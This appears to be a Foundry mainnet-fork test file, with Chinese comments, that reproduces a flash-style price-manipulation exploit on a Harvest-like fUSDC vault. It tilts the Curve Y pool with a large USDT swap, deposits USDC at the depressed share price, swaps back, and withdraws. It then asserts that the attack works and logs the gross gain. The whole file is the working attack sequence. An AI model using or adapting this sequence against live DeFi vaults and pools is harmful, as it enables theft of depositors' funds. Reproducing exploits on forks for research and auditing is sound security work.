// SPDX-License-Identifier: MIT
pragma solidity =0.8.10;

import "./ForkBase.sol";
import {Mainnet} from "../src/Addresses.sol";
import {IHarvestVaultLike, IHarvestStrategyLike} from "../src/interfaces/IHarvestVaultLike.sol";
import {ICurveYPoolLike} from "../src/interfaces/ICurveYPoolLike.sol";
import {IERC20Like} from "../src/interfaces/IERC20Like.sol";

/// @title 测试 3：单轮「砸盘 -> 低价存入 -> 回拉 -> 赎回」，不涉及还贷
/// @dev 用来独立验证经济学假设：份额确实被低价多铸，赎回确实多拿本金
contract DepositRedeemTest is ForkBase {
    function setUp() public {
        _fork();
    }

    function test_DepositAtDepressedPriceThenRedeemRestored() public {
        if (!forked) return;

        IHarvestVaultLike vault = IHarvestVaultLike(Mainnet.FUSDC);
        ICurveYPoolLike pool = ICurveYPoolLike(Mainnet.YPOOL);

        // 1) 准备资金：从"whale"账上直接取值（fork 测试常用手法）
        deal(Mainnet.USDT, address(this), Mainnet.TILT_USDT);
        deal(Mainnet.USDC, address(this), 50_000_000e6);

        // 2) 砸盘：USDT -> USDC，压低份额价
        IERC20Like(Mainnet.USDT).approve(Mainnet.YPOOL, Mainnet.TILT_USDT);
        ICurveYPoolLike(Mainnet.YPOOL).exchange_underlying(2, 1, Mainnet.TILT_USDT, 0);
        assertTrue(IHarvestStrategyLike(vault.strategy()).depositArbCheck(), "gate still open");

        // 3) 低价存入
        uint256 supplyBefore = vault.balanceOf(address(this));
        uint256 depositAmount = Mainnet.DEPOSIT_USDC;
        IERC20Like(Mainnet.USDC).approve(Mainnet.FUSDC, depositAmount);
        vault.deposit(depositAmount);
        uint256 shares = vault.balanceOf(address(this)) - supplyBefore;
        assertGt(shares, depositAmount, "shares > deposit when price is depressed");

        // 4) 回拉价格：把刚才换到的 USDC 再换回去
        uint256 back = IERC20Like(Mainnet.USDC).balanceOf(address(this));
        IERC20Like(Mainnet.USDC).approve(Mainnet.YPOOL, back);
        pool.exchange_underlying(1, 2, back, 0);

        // 5) 按复位后的价格赎回
        uint256 usdcBefore = IERC20Like(Mainnet.USDC).balanceOf(address(this));
        vault.withdraw(shares);
        uint256 redeemed = IERC20Like(Mainnet.USDC).balanceOf(address(this)) - usdcBefore;

        assertGt(redeemed, depositAmount, "redeem > deposit, attack works");
        emit log_named_decimal_uint("deposit", depositAmount, 6);
        emit log_named_decimal_uint("shares", shares, 6);
        emit log_named_decimal_uint("redeemed", redeemed, 6);
        emit log_named_decimal_uint("gross gain", redeemed - depositAmount, 6);
    }
}
